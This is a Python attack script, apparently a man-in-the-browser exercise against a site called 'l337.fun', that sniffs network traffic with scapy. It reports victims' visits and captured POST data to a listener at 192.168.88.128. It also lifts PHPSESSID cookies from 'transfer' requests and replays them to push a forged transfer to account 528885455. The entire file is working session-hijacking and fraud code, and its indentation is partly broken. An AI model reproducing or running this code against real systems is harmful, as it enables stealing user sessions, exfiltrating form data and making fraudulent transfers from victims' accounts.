from scapy.all import *
from socket import *
import re
import requests
import json

host = "192.168.88.128"
port = 1234

clientsock = socket(AF_INET, SOCK_DGRAM)

header = []
x = []


def Sending(msg):
    clientsock.sendto(msg, (host, port))


def CloneRequest(num, sess_id):
    sess_id = sess_id.replace('\r', '')
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0',
        'X-Requested-With': 'XMLHttpRequest',
    }
    payload = {'an': '528885455', 'amo': num}
    session = requests.Session()
    cookies = {'PHPSESSID': sess_id}
    session.post('http://l337.fun/mitb/index.php',
                 cookies=cookies, data=payload, headers=headers)
    A3 = "Request Cloned!"
    Sending(A3)


def sniffData(pkt):
    if pkt.haslayer(Raw):   # Check for the Data layer
        header = pkt.getlayer(Raw).load    # Get the sent data
        # Make sure it's a request
        if header.startswith('GET') or header.startswith('POST'):
            if 'l337.fun' in header:
                src = pkt.getlayer(IP).src
                A1 = "%s visited the site: %s" % (src, 'l337.fun site')
                Sending(A1)
                if header.startswith('POST'):
                    if 'transfer' in header:
                        data = header.split('\r\n\r\n')[1]
                        A2 = "[%s] POST data Captured: %s" % (src, data)
                        Sending(A2)
		    	target = "PHPSESSID="
		    	result = header.find(target)
		    	sess_id = header[result+10:result+36]
		   	if '528885455' not in header:
				y = data.split("&")
				x = y[1].split("=")
				CloneRequest(x[1], sess_id)


sniff(prn=sniffData)
